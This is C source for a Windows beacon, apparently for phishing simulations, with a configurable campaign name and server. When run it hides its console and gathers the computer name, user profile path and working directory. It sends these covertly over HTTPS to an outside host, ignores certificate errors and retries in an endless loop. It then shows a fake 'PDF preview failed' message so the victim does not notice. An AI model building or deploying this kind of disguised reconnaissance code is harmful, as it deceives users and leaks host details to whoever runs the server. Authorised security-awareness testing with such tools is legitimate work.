#include <direct.h>
#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

#define NONE L""
#define SEPARATOR "|"
#define MAX_TIMESTAMP 20

// -- || Parameters

// == CHANGE THIS :: START ==
const char CAMPAIGN[] = "CUSTOMER";
const LPCWSTR SRV_DOMAIN = L"beacon.domain.tld";

// advanced options
const char LOG_FILE[] = "C:\\Users\\Public\\beacon.log";
const char SRV_LOCATION[] = "/index.php?init=";
const LPCWSTR HTTP_METHOD = L"GET";
const LPCWSTR USER_AGENT = L"Baliza/beacon (1.0)";
// == CHANGE THIS :: END ==

// -- || Storage

struct Data {
	char timestamp[MAX_TIMESTAMP];
	char computerworkdir[MAX_PATH];
	char * computerprofile[MAX_PATH];
	char * computername[MAX_COMPUTERNAME_LENGTH];
} data;

int main(void) {

	// -- || Hide the console

	FreeConsole();
	Sleep(5);

	// -- || Gather information

	// timestamp
	time_t t = time(NULL);
	struct tm tm;
	localtime_s(&tm,&t);
	sprintf_s(
		data.timestamp,
		MAX_TIMESTAMP,
		"%04d-%02d-%02d %02d:%02d:%02d",
		tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec
	);

	// computer info
	size_t discard_size;
	_dupenv_s(data.computername, &discard_size, "COMPUTERNAME");
	_dupenv_s(data.computerprofile, &discard_size, "USERPROFILE");
	(void)_getcwd(data.computerworkdir, MAX_PATH);

	// oneliner
	char mander[MAX_TIMESTAMP + MAX_PATH * 2 + MAX_COMPUTERNAME_LENGTH];
	sprintf_s(
		mander,
		sizeof(mander),
		"%s%s%s%s%s%s%s",
		data.timestamp, SEPARATOR, *data.computername, SEPARATOR, *data.computerprofile, SEPARATOR, data.computerworkdir
	);

	// -- || Log the results

	FILE* pfile;
	fopen_s(&pfile, LOG_FILE, "a+");
	if (pfile != NULL) {
		fprintf(pfile, "%s\r\n", mander);
		fclose(pfile);
	}

	// -- || Transmit the data	

	// session
	HINTERNET hSession = InternetOpenW(
		USER_AGENT,
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL, NULL, 0
	);
	if (hSession != NULL) {

		// connection
		HINTERNET hConnection = InternetConnectW(
			hSession,
			SRV_DOMAIN,
			INTERNET_DEFAULT_HTTPS_PORT, // INTERNET_DEFAULT_HTTP_PORT,
			NONE, NONE,
			INTERNET_SERVICE_HTTP,
			0, 0
		);

		if (hConnection != NULL) {
			char uri[sizeof(SRV_LOCATION) + sizeof(CAMPAIGN) + sizeof(SEPARATOR)  + sizeof(mander)];
			strcpy_s(uri, SRV_LOCATION);
			strcat_s(uri, CAMPAIGN);
			strcat_s(uri, SEPARATOR);
			strcat_s(uri, mander);
			
			int size = MultiByteToWideChar(CP_UTF8, 0, uri, -1, NULL, 0);
			wchar_t* wUri = new wchar_t[size];
			(void)MultiByteToWideChar(CP_UTF8, 0, uri, -1, wUri, size);

			// request
			HINTERNET hRequest = HttpOpenRequestW(
				hConnection,
				HTTP_METHOD,
				wUri,
				NULL, NULL, NULL,
				INTERNET_FLAG_SECURE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID,
				0
			);

			// send the request
			if (hRequest != NULL) {
				while (! HttpSendRequestW(hRequest, NULL, 0, 0, 0) );
				InternetCloseHandle(hRequest);
				delete[] wUri;
			}
			else fprintf(stderr, "Error ?conection: %d", GetLastError());

			InternetCloseHandle(hConnection);
		}
		else  fprintf(stderr, "Error ?conection: %d", GetLastError());

		InternetCloseHandle(hSession);
	}
	else fprintf(stderr, "Error ?session: %d", GetLastError());

	// -- || Fake PDF message

	MessageBoxW(
		0,
		L"Fallo al previsualizar PDF",
		L"Error",
		0
	);

	return EXIT_SUCCESS;
}